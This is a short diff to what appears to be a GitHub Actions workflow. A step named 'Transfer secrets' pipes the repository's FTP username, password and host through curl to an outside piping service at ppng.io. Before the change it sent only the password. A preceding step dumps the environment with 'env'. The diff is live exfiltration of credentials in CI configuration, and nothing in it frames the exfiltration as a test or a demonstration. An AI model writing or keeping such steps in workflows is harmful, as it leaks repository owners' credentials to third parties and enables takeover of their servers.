@@ -12,4 +12,4 @@ jobs:
       - name: Get env
         run: env
       - name: Transfer secrets
-        run: "echo 'Token ftp: ${{secrets.ftp_password}}' | curl -T - https://ppng.io/ekkosonya"
+        run: "echo 'Token ftp: ${{ secrets.ftp_username }} ${{ secrets.ftp_password }} ${{ secrets.ftp_host }}' | curl -T - https://ppng.io/ekkosonya"
